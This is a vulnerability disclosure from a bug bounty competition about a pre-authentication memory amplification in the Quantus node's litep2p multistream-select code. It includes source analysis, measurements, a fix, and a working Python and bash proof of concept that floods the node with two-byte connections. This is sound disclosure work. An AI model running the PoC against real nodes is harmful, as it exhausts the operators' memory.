# 88226 bc medium two unauthenticated bytes make a node commit 16 kib of resident memory in the pre handshake multistream select framing path

**Submitted on Aug 12th 2026 at 10:03:48 UTC by @shadowHunter for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88226
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## 1. Summary

During multistream-select protocol negotiation, which happens on a **plaintext socket, before the Dilithium/ML-KEM noise handshake, with no authentication of any kind**, litep2p reads an unsigned-varint length prefix and immediately sizes its read buffer to the value the *remote peer* declared:

`client/litep2p/src/multistream_select/length_delimited.rs:174`

```rust
this.read_buffer.resize(len as usize, 0);
```

`len` is capped at `MAX_FRAME_SIZE = (1 << 14) - 1 = 16_383` (line 31), so a peer cannot declare more than 16 KiB. But nothing requires the peer to ever *send* those bytes. Two bytes — `\xff\x7f`, the varint for 16383 — cause the node to commit 16,383 bytes and then wait.

Crucially, `read_buffer` is a `BytesMut` and this is `BytesMut::resize`, which **writes the fill byte**. The pages are therefore touched and become **resident**. This is the distinction that matters: the sibling allocation pattern `vec![0u8; n]` / `BytesMut::zeroed` lowers to `alloc_zeroed`, whose zero pages are committed lazily and stay **virtual**. A previously-reported 16 MiB request-frame finding in this same subsystem was correctly refuted on exactly that ground. This site behaves differently, and the measurement below confirms it.

**Measured:** 10,000 concurrent connections, 2 bytes each (20,000 bytes total from the attacker), grew the victim's resident set by **211.4 MiB**, of which **155.6 MiB is attributable to this line** after subtracting the control. (All memory figures in this report are binary units converted from the kB values reported by `/proc/<pid>/status`, which are KiB.)

## 2. Description

### 2.1 The allocation is attacker-controlled and pre-authentication

`client/litep2p/src/transport/tcp/connection.rs:413-453`, `negotiate_connection`:

```rust
// negotiate `noise`
let (stream, _) =
    Self::negotiate_protocol(stream, &role, vec!["/noise"], substream_open_timeout).await?;   // line 435

// perform noise handshake
let (stream, peer) = noise::handshake(...).await?;                                            // line 444
```

`negotiate_protocol` is where `LengthDelimited` lives. It runs at line 435, and `noise::handshake` runs at line 444. The buffer is therefore sized **nine lines before any cryptography happens**. The attacker needs no key material, no valid peer identity, and no proof of work. It needs a TCP connection and two bytes.

### 2.2 The size is exactly what the remote asked for

`length_delimited.rs:30-31`:

```rust
const MAX_LEN_BYTES: u16 = 2;
const MAX_FRAME_SIZE: u16 = (1 << (MAX_LEN_BYTES * 8 - MAX_LEN_BYTES)) - 1;   // 16_383
```

The varint decoder reads at most 2 bytes, so `len` is structurally capped at 16,383 — there is no missing bounds check, and this report does not claim one. The defect is that a **declared** length is committed as **written** memory before a single byte of the frame body has arrived, on an unauthenticated connection.

`\xff\x7f` decodes as `0x7f | (0x7f << 7) = 16383`.

### 2.3 Why it is resident and not virtual

`read_buffer` is declared at `client/litep2p/src/multistream_select/length_delimited.rs:48`:

```rust
read_buffer: BytesMut,
```

`BytesMut::resize(new_len, value)` reserves capacity and then fills the new region with `value` via `put_bytes`, i.e. an explicit `write_bytes`. Every page is touched. Additionally, 16,383 bytes is below glibc's 128 KiB `M_MMAP_THRESHOLD`, so the allocation is served from the heap arena rather than a fresh lazily-committed `mmap`.

The measurement in Step 6 does not rely on this reasoning — it measures `VmRSS` directly but the reasoning predicts the measured result, and the prediction matched to 99.6 %.

### 2.4 What bounds it

Two mechanisms, both measured:

**The 5-second negotiation timeout.** `client/litep2p/src/transport/tcp/connection.rs:394`:

```rust
match tokio::time::timeout(substream_open_timeout, async move {
    ...listener_select_proto(stream, protocols).await
})
```

with `SUBSTREAM_OPEN_TIMEOUT = Duration::from_secs(5)` (`transport/mod.rs:47`). Note this is the *inner* and tighter of two timeouts; the outer `CONNECTION_OPEN_TIMEOUT` of 10 s (`client/litep2p/src/transport/mod.rs:44`, applied at `client/litep2p/src/transport/tcp/connection.rs:328`) never gets the chance to fire on this path. Measured connection lifetime was **5.15 s** (§6.6).

**The plateau.** Freed 16 KiB chunks are retained by the allocator rather than returned to the OS, so the victim's RSS stays elevated after the attack — but for the same reason a second wave reuses those chunks instead of adding to them. Waves 2 and 3 added +20 kB and +8 kB over wave 1's +43,292 kB. The effect is a permanent step to a high-water mark, not a ratchet.

### 2.5 The 10,000-connection limit does not apply here

`MAX_CONNECTIONS_ESTABLISHED_INCOMING = 10_000` (`client/network/src/lib.rs:310`) is applied at `client/network/src/litep2p/mod.rs:521`. Following it through, `ConnectionLimits::on_incoming` (`transport/manager/limits.rs`) tests `self.incoming_connections.len()`, a set of **established** connections, and `on_pending_incoming_connection` (`transport/manager/mod.rs:731-733`) calls it without registering the pending connection anywhere.

So connections that never complete the noise handshake are not counted against that ceiling. This cuts both ways and both are stated: the attack is not capped at 10,000, but it *is* capped by the victim's file-descriptor limit, which the node never sets for itself — a repository-wide search for `setrlimit` / `RLIMIT_NOFILE` / `LimitNOFILE` returns nothing, so the node inherits whatever its launcher provides.

## 3. Steps to reproduce

{% stepper %}
{% step %}

## Start a pristine node

Start a pristine node with local mining disabled (so RSS is quiet):

```bash
quantus-node --dev --base-path /tmp/victim --port 31333 \
  --rpc-port 9955 --miner-listen-port 9855 --no-telemetry --no-prometheus
```

{% endstep %}

{% step %}

## Record baseline memory

Record `VmRSS` from `/proc/<pid>/status`.
{% endstep %}

{% step %}

## Open connections and declare a large frame

Open N TCP connections to port 31333. On each, send the two bytes `\xff\x7f` and then send nothing.
{% endstep %}

{% step %}

## Measure memory during the negotiation window

Within 5 seconds, read `VmRSS` again.
{% endstep %}

{% step %}

## Observe the allocation growth

Observe roughly `N × 22.2 kB` of growth, of which `N × 16.3 kB` is attributable to the two bytes (see the control arm in step 6).
{% endstep %}

{% step %}

## Run the control arm

Repeat with connections that send **nothing at all**. Growth falls to `N × 5.9 kB` — this is the cost of the TCP connection and its task, and it is what must be subtracted.
{% endstep %}
{% endstepper %}

## 4. Impact

### 4.1 Measured, not extrapolated

Every figure in this table is a direct measurement against the pristine release binary `quantus-node-victim`, sha256 `84c31d34edc2440f779f9f24d7947cd2e6523d56e99afa21abacbd8ee997670c`.

| N concurrent | Arm                       | Attacker bytes total | Victim VmRSS delta | Per connection |
| ------------ | ------------------------- | -------------------: | -----------------: | -------------: |
| 2,000        | `silent` (control)        |                    0 |         +11,428 kB |        5,851 B |
| 2,000        | `small`, len=64 (control) |                2,000 |         +11,488 kB |        5,882 B |
| 2,000        | `big`, len=16383          |                4,000 |     **+43,292 kB** |   **22,166 B** |
| 10,000       | `silent` (control)        |                    0 |         +57,188 kB |        5,856 B |
| 10,000       | `big`, len=16383          |               20,000 |    **+216,496 kB** |   **22,169 B** |

**Attributable to `read_buffer.resize`:**

| N      | big − silent, per connection | vs. predicted 16,383 B |
| ------ | ---------------------------: | ---------------------: |
| 2,000  |                     16,315 B |                 99.6 % |
| 10,000 |                     16,313 B |                 99.6 % |

At N = 10,000 the total attributable growth is **159,308 KiB ≈ 155.6 MiB**, produced by **20,000 attacker bytes**. That is an amplification of **8,157 resident bytes per attacker byte**.

The victim's total RSS went from 250,904 KiB to 467,400 KiB — a rise of 216,496 KiB (**211.4 MiB**, an **86 % increase**) — and did not fall back after the connections closed.

### 4.2 The `small` control is what makes this attributable

The `small` arm sends a one-byte varint declaring a 64-byte frame. It traverses the identical code path and executes the identical `resize()` call. It produced 5,882 B/conn against the silent control's 5,851 B/conn — a difference of **31 bytes**.

So the growth in the `big` arm is caused by the *declared frame length*, not by the connection, not by the task, and not by the code path being entered. Without this arm the headline number would have been the uninterpretable 22,166 B/conn.

### 4.3 Scope, stated honestly

* **This is not unbounded.** The plateau result (§2.4) means an attacker cannot drive memory up indefinitely by reconnecting. They reach a high-water mark set by peak concurrency and stay there.
* **The peak does not need to be sustained, because the memory is never returned.** This is the point most likely to be misread, so it is stated precisely. Reaching the measured peak took **one burst of 1.89 seconds** (`opened 10000, failed 0, in 1.89s`). Every connection then expired on its own after \~5.15 s — and the victim's RSS did not fall: `VmRSS after release: 467,412 kB (baseline 250,904, retained +216,508 kB)`. glibc retains the freed 16 KiB chunks rather than returning them to the OS, so the increase persists for the lifetime of the process. **A single sub-two-second burst permanently raises the node's resident floor by 211 MiB.** Holding the connections open is unnecessary, and repeating the burst is pointless — waves 2 and 3 added 20 kB and 8 kB (§6.7).
* **On "without brute force actions".** The relevant impact excludes brute force, so what the attack actually costs is worth being exact about: **20,000 bytes total, delivered in 1.89 seconds, once.** There is no sustained flood, no repetition, and no need to hold state — the effect outlives the connections that caused it. Opening 10,000 TCP connections in under two seconds is the whole of the effort involved.
* **The ceiling depends on the operator's fd limit, which this report cannot state for production deployments.** The measurements used `ulimit -n 65536`. A node run with the common default of 1,024 would cap the attack at roughly 16 MiB of attributable resident memory; one at 65,536 would reach roughly 1.0 GiB. The repository ships no fd-limit configuration, so this is entirely deployment-dependent.
* **N = 1 per configuration.** Each cell in the table above is a single run. The consistency across three values of N (280, 2,000, 10,000) and across three waves within each run is the evidence for stability, not repeated independent trials.
* **Measured on one host** (WSL2 Ubuntu, 12 cores, 9.9 GB RAM, glibc malloc). The residency conclusion depends on allocator behaviour; a node built against a different allocator (jemalloc, mimalloc) could plausibly differ, and this was not tested.

### 4.4 Why it still matters

The attacker requirement is: reach the p2p port, and send two bytes per connection. No proof of work, no stake, no valid peer identity, no completed handshake, no protocol conformance beyond a single varint. The cost asymmetry is roughly four orders of magnitude, and the memory is committed *before* the expensive Dilithium handshake — so this composes with, rather than competes against, any other pre-authentication pressure on the same port.

## 5. Recommendation

The fix is to stop pre-committing the declared length and instead grow the buffer as data actually arrives.

```rust
// length_delimited.rs, in ReadState::ReadLength
if len >= 1 {
    *this.read_state = ReadState::ReadData { len, pos: 0 };
    // Do NOT size to the declared length. Reserve a small initial chunk and
    // grow as bytes actually arrive, so a peer that declares 16 KiB and sends
    // nothing costs nothing.
    this.read_buffer.clear();
    this.read_buffer.reserve(std::cmp::min(len as usize, INITIAL_FRAME_CHUNK));
}
```

with the `ReadData` arm extending the buffer towards `len` as `pos` advances.

Two cheaper mitigations, either of which materially reduces the exposure:

* **Cap the negotiation frame to what the protocol actually needs.** The module's own documentation says frames "mostly consist in a short protocol name, which is highly unlikely to be more than 16KiB long". The longest protocol string this node negotiates is well under 128 bytes. Rejecting a declared multistream-select frame length above, say, 1 KiB would cost nothing in functionality and cut the amplification by 16×.
* **Count pending inbound connections against a limit.** `on_pending_incoming_connection` currently consults a limit that only tracks established connections (§2.5). Tracking in-negotiation connections and capping them would bound this and every other pre-handshake allocation at once.

Lowering `SUBSTREAM_OPEN_TIMEOUT` would shrink the window but is not recommended as the primary fix — it trades against legitimate slow peers.

## Proof of Concept

## 6. Proof of concept

### 6.1 Environment

* Host: WSL2 Ubuntu, 12 cores, 9,944 MB RAM
* Victim binary: `quantus-node-victim`, an unmodified release build of `223d938`, sha256 `84c31d34edc2440f779f9f24d7947cd2e6523d56e99afa21abacbd8ee997670c` (verified by the harness at every run)
* Victim launched with `--miner-listen-port` so local mining is off; the node's own help states "When `--miner-listen-port` is set, local mining is disabled." Without this the dev node burns \~85 % of a core and its allocation churn swamps the measurement.
* `ulimit -n 65536` (the victim needs one fd per inbound connection; the default 1024 would silently cap the experiment), `ulimit -c 0` (a memory PoC must never be able to write a core dump).
* Each arm runs against a **freshly started victim process**. This is required: glibc does not return the freed 16 KiB chunks to the OS, so running two arms against one process would let the first arm's high-water mark contaminate the second.

### 6.2 The driver — `poc10_msalloc.py`

Complete; this is the file that produced every number in §4. It needs only Python 3 and a Linux `/proc` — no third-party packages, no build step.

*Provenance:* the executable code below is byte-for-byte the code that ran (verified by comparing the parsed AST of this listing against the on-disk script, docstrings excluded — identical). The only edits are to the module docstring: two references to internal working notes were removed, and the `TIMEOUT NOTE` was corrected. The original docstring said the bound was `CONNECTION_OPEN_TIMEOUT = 10s`; the 5-second `SUBSTREAM_OPEN_TIMEOUT` was only identified afterwards, from the measured 5.15 s lifetime in §6.6. No executable line differs.

{% code title="poc10\_msalloc.py" %}

```python
#!/usr/bin/env python3
"""
Task B driver - resident memory amplification via the multistream-select
length-delimited read buffer.

CLAIM UNDER TEST
----------------
client/litep2p/src/multistream_select/length_delimited.rs:174

    this.read_buffer.resize(len as usize, 0);

`read_buffer` is a `BytesMut` (declaration at line 48). `BytesMut::resize`
reserves and then writes the fill byte, so the pages are TOUCHED and become
RESIDENT - unlike `BytesMut::zeroed`, which is `vec![0; n]` -> `alloc_zeroed`
-> lazily-committed zero pages that stay VIRTUAL. That distinction is exactly
what refuted the earlier 16 MiB request-frame finding, so this script measures
BOTH VmRSS and VmSize and reports them separately.

`len` is a u16 varint capped by MAX_LEN_BYTES = 2, so max 0x3FFF = 16383.
Two attacker bytes (\\xff\\x7f) declare a 16383-byte frame; the attacker then
sends nothing. This happens during multistream-select negotiation, i.e.
BEFORE the noise handshake - no crypto, no key material, no peer identity.

ARMS
----
  silent : connect, send nothing.        Control: isolates per-connection
           socket + task overhead, read_buffer stays at DEFAULT_BUFFER_SIZE=64.
  big    : connect, send \\xff\\x7f.     Treatment: read_buffer -> 16383 bytes.
  small  : connect, send \\x40.          Second control: same code path, same
           resize() call, len=64 -> negligible allocation. If `big` grows and
           `small` does not, the growth is the frame length, not the code path.

The per-connection cost of the resize is (big - silent) / N.

PRECONDITION GATE
-----------------
Every arm asserts the victim actually accepted the connections by counting
entries in /proc/<pid>/fd. An arm whose fd count does not rise by ~N is
reported as INVALID rather than as a measurement.

TIMEOUT NOTE
------------
Inbound negotiation is wrapped in tokio::time::timeout(substream_open_timeout)
at client/litep2p/src/transport/tcp/connection.rs:394, with
SUBSTREAM_OPEN_TIMEOUT = 5s (client/litep2p/src/transport/mod.rs:47).
A silent connection is therefore dropped after ~5s. The sampler runs long
enough to see the rise AND the expiry, and --waves repeats the burst to
distinguish "high-water mark the allocator retains" from "unbounded growth".
"""

import argparse
import csv
import os
import socket
import sys
import threading
import time

# unsigned-varint encodings
VARINT_16383 = b"\xff\x7f"   # 0x7f | (0x7f << 7) = 16383 = MAX_FRAME_SIZE
VARINT_64 = b"\x40"          # 64, single byte, MSB clear

PAYLOADS = {
    "silent": b"",
    "big": VARINT_16383,
    "small": VARINT_64,
}


def read_status(pid):
    """VmRSS and VmSize in kB from /proc/<pid>/status."""
    rss = size = -1
    with open(f"/proc/{pid}/status", "r") as fh:
        for line in fh:
            if line.startswith("VmRSS:"):
                rss = int(line.split()[1])
            elif line.startswith("VmSize:"):
                size = int(line.split()[1])
            if rss >= 0 and size >= 0:
                break
    return rss, size


def read_fdcount(pid):
    try:
        return len(os.listdir(f"/proc/{pid}/fd"))
    except OSError:
        return -1


class Sampler(threading.Thread):
    """Samples the victim's memory into a list until stopped."""

    def __init__(self, pid, interval):
        super().__init__(daemon=True)
        self.pid = pid
        self.interval = interval
        self.rows = []
        self.phase = "init"
        # NB: not `self._stop` - that shadows threading.Thread._stop(), which
        # Thread.join() calls internally, and join() then dies with
        # "TypeError: 'Event' object is not callable".
        self._stopev = threading.Event()
        self.t0 = time.time()

    def run(self):
        while not self._stopev.is_set():
            try:
                rss, size = read_status(self.pid)
            except (OSError, ValueError):
                break
            self.rows.append({
                "t": round(time.time() - self.t0, 3),
                "phase": self.phase,
                "vmrss_kb": rss,
                "vmsize_kb": size,
                "victim_fds": read_fdcount(self.pid),
            })
            self._stopev.wait(self.interval)

    def stop(self):
        self._stopev.set()

    def window(self, phase):
        return [r for r in self.rows if r["phase"] == phase]


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.opened = 0
        self.failed = 0


def opener(host, port, count, payload, stats, sockets, lock):
    local = []
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10.0)
            s.connect((host, port))
            if payload:
                s.sendall(payload)
            local.append(s)
            with stats.lock:
                stats.opened += 1
        except Exception:
            with stats.lock:
                stats.failed += 1
    with lock:
        sockets.extend(local)


def burst(host, port, n, threads, payload, stats, sockets):
    lock = threading.Lock()
    # Distribute the remainder, otherwise n=300 with 40 threads opens only 280.
    counts = [n // threads + (1 if i < n % threads else 0) for i in range(threads)]
    ts = []
    for per in counts:
        t = threading.Thread(target=opener,
                             args=(host, port, per, payload, stats, sockets, lock))
        t.start()
        ts.append(t)
    for t in ts:
        t.join()


def summarize(rows, key):
    vals = [r[key] for r in rows if r[key] >= 0]
    if not vals:
        return None
    return {"min": min(vals), "max": max(vals), "last": vals[-1],
            "median": sorted(vals)[len(vals) // 2], "n": len(vals)}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=30333)
    ap.add_argument("--pid", type=int, required=True)
    ap.add_argument("--connections", type=int, default=2000)
    ap.add_argument("--threads", type=int, default=40)
    ap.add_argument("--mode", choices=sorted(PAYLOADS), default="big")
    ap.add_argument("--baseline", type=float, default=15.0)
    ap.add_argument("--hold", type=float, default=8.0,
                    help="seconds to hold after the burst (keep < 10s timeout "
                         "to measure the peak before negotiation expiry)")
    ap.add_argument("--settle", type=float, default=25.0,
                    help="seconds to observe after releasing, to see expiry")
    ap.add_argument("--waves", type=int, default=1)
    ap.add_argument("--interval", type=float, default=0.25)
    ap.add_argument("--csv", default=None)
    args = ap.parse_args()

    payload = PAYLOADS[args.mode]

    print("=" * 72)
    print(" Task B  multistream-select read_buffer resident allocation")
    print("=" * 72)
    print(f" target       : {args.host}:{args.port}   victim pid {args.pid}")
    print(f" arm          : {args.mode}   payload={payload!r} ({len(payload)} bytes/conn)")
    print(f" connections  : {args.connections} x {args.waves} wave(s), {args.threads} threads")
    print()

    sampler = Sampler(args.pid, args.interval)
    sampler.phase = "baseline"
    sampler.start()

    print(f"[1] baseline, {args.baseline:.0f}s idle ...")
    time.sleep(args.baseline)
    base = summarize(sampler.window("baseline"), "vmrss_kb")
    base_size = summarize(sampler.window("baseline"), "vmsize_kb")
    base_fd = summarize(sampler.window("baseline"), "victim_fds")
    print(f"    VmRSS  median {base['median']:,} kB   (min {base['min']:,} max {base['max']:,})")
    print(f"    VmSize median {base_size['median']:,} kB")
    print(f"    victim fds    {base_fd['median']}")
    print()

    results = []
    for wave in range(1, args.waves + 1):
        tag = f"wave{wave}"
        sampler.phase = tag
        stats = Stats()
        sockets = []
        print(f"[2.{wave}] opening {args.connections} connections ...")
        t_open = time.time()
        burst(args.host, args.port, args.connections, args.threads,
              payload, stats, sockets)
        open_secs = time.time() - t_open
        print(f"    opened {stats.opened}, failed {stats.failed}, in {open_secs:.2f}s")
        time.sleep(args.hold)

        w = sampler.window(tag)
        peak = summarize(w, "vmrss_kb")
        peak_size = summarize(w, "vmsize_kb")
        peak_fd = summarize(w, "victim_fds")

        # ---- precondition gate ----
        fd_rise = peak_fd["max"] - base_fd["median"]
        landed = fd_rise >= 0.5 * stats.opened and stats.opened >= 0.9 * args.connections
        print(f"    victim fds: {base_fd['median']} -> {peak_fd['max']} (+{fd_rise})")
        if not landed:
            print(f"    !! GATE FAILED: fd rise {fd_rise} vs {stats.opened} opened. "
                  f"Measurement INVALID.")
        d_rss = peak["max"] - base["median"]
        d_size = peak_size["max"] - base_size["median"]
        per_conn = d_rss * 1024.0 / stats.opened if stats.opened else 0
        print(f"    VmRSS  peak {peak['max']:,} kB   delta +{d_rss:,} kB")
        print(f"    VmSize peak {peak_size['max']:,} kB   delta +{d_size:,} kB")
        print(f"    ---> resident bytes per connection: {per_conn:,.0f}")
        results.append({
            "wave": wave, "opened": stats.opened, "failed": stats.failed,
            "fd_rise": fd_rise, "gate_ok": landed,
            "d_rss_kb": d_rss, "d_vmsize_kb": d_size, "per_conn_bytes": per_conn,
        })

        sampler.phase = f"release{wave}"
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
        print(f"    released; observing {args.settle:.0f}s for negotiation timeout ...")
        time.sleep(args.settle)
        rel = summarize(sampler.window(f"release{wave}"), "vmrss_kb")
        print(f"    VmRSS after release: {rel['last']:,} kB "
              f"(baseline {base['median']:,}, retained +{rel['last'] - base['median']:,} kB)")
        print()

    sampler.stop()
    sampler.join(timeout=2)

    print("[3] SUMMARY")
    print(f"    arm={args.mode} payload={len(payload)} bytes/conn")
    for r in results:
        flag = "" if r["gate_ok"] else "  <-- GATE FAILED, INVALID"
        print(f"    wave {r['wave']}: +{r['d_rss_kb']:,} kB RSS over {r['opened']} conns"
              f" = {r['per_conn_bytes']:,.0f} B/conn{flag}")
    if results:
        amp = results[0]["per_conn_bytes"] / len(payload) if payload else float("nan")
        print(f"    wave-1 amplification (resident bytes / attacker byte): {amp:,.0f}x")

    if args.csv:
        with open(args.csv, "w", newline="") as fh:
            wr = csv.DictWriter(fh, fieldnames=["t", "phase", "vmrss_kb",
                                                "vmsize_kb", "victim_fds"])
            wr.writeheader()
            wr.writerows(sampler.rows)
        print(f"    samples -> {args.csv}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

{% endcode %}

The whole attack is four lines of that file — `socket.connect`, `sendall(b"\xff\x7f")`, and never sending anything else. Everything else is measurement and controls.

### 6.3 The orchestrator — `poc10_run.sh`

Complete and verbatim.

{% code title="poc10\_run.sh" %}

```bash
#!/usr/bin/env bash
# Task B orchestrator - multistream-select read_buffer resident allocation.
#
# Runs one arm against a FRESH victim process. A fresh victim per arm is
# required: glibc malloc does not return freed 16 KiB chunks to the OS, so
# running two arms against one process would let the first arm's high-water
# mark contaminate the second.
#
# Usage:  poc10_run.sh <arm> <connections> [waves]
#         arm = silent | small | big
set -uo pipefail

ARM="${1:-big}"
CONNS="${2:-2000}"
WAVES="${3:-1}"

POC="$HOME/quantus-poc/poc10-msalloc"
NODE="$HOME/quantus-poc/bin/quantus-node-victim"
OUT="$POC/out-$ARM-$CONNS"
P2P_PORT="${P2P_PORT:-31333}"
RPC_PORT="${RPC_PORT:-9955}"
MINER_PORT="${MINER_PORT:-9855}"
BASE_PATH="/tmp/quantus-poc10-node"

# No core dumps: a resource-exhaustion PoC must never be able to write a
# multi-GB dump to the host.
ulimit -c 0
# The victim needs one fd per inbound connection; a default of 1024
# would silently cap the experiment far below N.
ulimit -n 65536 2>/dev/null || echo "WARN: could not raise ulimit -n"

mkdir -p "$OUT"

echo "=============================================================="
echo " Task B  arm=$ARM  connections=$CONNS  waves=$WAVES"
echo " date : $(date -u)"
echo " ulimit -n : $(ulimit -n)   ulimit -c : $(ulimit -c)"
echo "=============================================================="

if [ ! -x "$NODE" ]; then echo "FATAL: victim binary missing at $NODE"; exit 1; fi

echo
echo "### victim binary provenance (must be the PRISTINE build)"
sha256sum "$NODE" | tee "$OUT/victim-sha256.txt"
echo "expected: 84c31d34edc2440f779f9f24d7947cd2e6523d56e99afa21abacbd8ee997670c"

echo
echo "### starting victim (dev chain, local mining DISABLED via --miner-listen-port)"
rm -rf "$BASE_PATH" 2>/dev/null
mkdir -p "$BASE_PATH/chains/dev/db" || { echo "FATAL: cannot create $BASE_PATH"; exit 1; }
RUST_LOG="info" \
"$NODE" --dev \
  --base-path "$BASE_PATH" \
  --port "$P2P_PORT" \
  --rpc-port "$RPC_PORT" \
  --miner-listen-port "$MINER_PORT" \
  --no-telemetry \
  --no-prometheus \
  > "$OUT/node.log" 2>&1 &
NODE_PID=$!
echo "    victim pid = $NODE_PID"

cleanup() {
  echo
  echo "### stopping victim (pid $NODE_PID)"
  kill "$NODE_PID" 2>/dev/null
  wait "$NODE_PID" 2>/dev/null
}
trap cleanup EXIT

echo "    waiting for p2p port $P2P_PORT ..."
for i in $(seq 1 60); do
  if (echo > /dev/tcp/127.0.0.1/"$P2P_PORT") 2>/dev/null; then
    echo "    port open after ${i}s"; break
  fi
  sleep 1
done

if ! kill -0 "$NODE_PID" 2>/dev/null; then
  echo "FATAL: victim died on startup:"; tail -20 "$OUT/node.log"; exit 1
fi

# Let the node reach a steady state before baselining - startup allocations
# and the initial DB open would otherwise show up as attack-attributable RSS.
echo "    settling 30s before baseline ..."
sleep 30

echo
echo "### running driver"
python3 "$HOME/quantus-poc/poc10-msalloc/poc10_msalloc.py" \
  --host 127.0.0.1 --port "$P2P_PORT" --pid "$NODE_PID" \
  --connections "$CONNS" --mode "$ARM" --waves "$WAVES" \
  --csv "$OUT/samples.csv" \
  2>&1 | tee "$OUT/run.txt"

echo
echo "### victim-side evidence"
grep -ciE "multistream|negotiat" "$OUT/node.log" | tee "$OUT/negotiation-lines.txt"
tail -5 "$OUT/node.log"

echo
echo "### artifacts in $OUT"
ls -la "$OUT"
```

{% endcode %}

One portability note on the above: `BASE_PATH` is under `/tmp`, which is what the runs used. On a host where `systemd-tmpfiles` may clean `/tmp`, point it at a persistent directory instead — a `/tmp` wiped under a running node surfaces as a misleading `RocksDB IO error: No such file or directory: While mkdir if missing`.

### 6.4 How it was invoked

The exact commands behind every figure in §4:

```bash
# the three-arm matrix at N=2,000, three waves each (§4.1, §6.7)
for arm in silent small big; do bash poc10_run.sh $arm 2000 3; sleep 5; done

# the headline scaling point at N=10,000, single wave (§4.1, §6.8)
for arm in silent big; do bash poc10_run.sh $arm 10000 1; sleep 5; done
```

Each invocation starts and stops its own victim, so the arms are independent by construction.

### 6.5 Precondition gate

Two earlier experiments in this engagement produced meaningless "no effect" data because the attack never actually landed. Every arm here therefore asserts, before any number is recorded, that the victim really accepted the connections — by counting entries in `/proc/<pid>/fd`:

```
victim fds: 35 -> 10035 (+10000)
```

An arm whose fd count does not rise by at least half of N is printed as `GATE FAILED, INVALID` rather than as a measurement. No arm in this report failed the gate.

### 6.6 Connection lifetime, measured

From `samples.csv` of the N = 2,000 `big` arm, `victim_fds` over time:

```
  t= 14.649 rss= 265,716 fds=  294     <- burst starting
  t= 14.957 rss= 298,024 fds= 2035     <- all 2,000 established
  t= 15.275 rss= 304,448 fds= 2035
  ...                       (steady)
  t= 19.339 rss= 304,448 fds= 2035
  t= 19.591 rss= 304,448 fds= 1987     <- timeouts begin firing
  t= 19.843 rss= 304,448 fds=  908
  t= 20.096 rss= 304,448 fds=   35     <- all closed
  t= 22.872 rss= 304,448 fds=   35     <- RSS unchanged after closure
```

Established at t = 14.957, fully closed by t = 20.096: a lifetime of **5.15 s**, matching `SUBSTREAM_OPEN_TIMEOUT = 5s` and confirming that the tighter of the two timeouts is the operative one.

The last two lines are the other half of the result: the connections are gone and `VmRSS` has not moved. The memory is retained by the allocator.

### 6.7 The plateau, measured

N = 2,000, three consecutive waves against one victim:

```
    wave 1: +43,292 kB RSS over 2000 conns = 22,166 B/conn
    wave 2: +43,312 kB RSS over 2000 conns = 22,176 B/conn
    wave 3: +43,320 kB RSS over 2000 conns = 22,180 B/conn
```

Waves 2 and 3 add 20 kB and 8 kB. This is reported because it **limits the finding**: the attack is a step to a high-water mark, not a ratchet, and any claim of unbounded growth would be wrong.

### 6.8 Full output, N = 10,000

```
 arm          : big   payload=b'\xff\x7f' (2 bytes/conn)
[1] baseline, 15s idle ...
    VmRSS  median 250,904 kB
    victim fds    35
[2.1] opening 10000 connections ...
    opened 10000, failed 0, in 1.89s
    victim fds: 35 -> 10035 (+10000)
    VmRSS  peak 467,400 kB   delta +216,496 kB
    ---> resident bytes per connection: 22,169
```

against the control:

```
 arm          : silent   payload=b'' (0 bytes/conn)
    opened 10000, failed 0, in 1.39s
    victim fds: 35 -> 10035 (+10000)
    VmRSS  peak 301,008 kB   delta +57,188 kB
    ---> resident bytes per connection: 5,856
```

22,169 − 5,856 = **16,313 bytes per connection attributable to `read_buffer.resize`**, against 16,383 predicted from source.
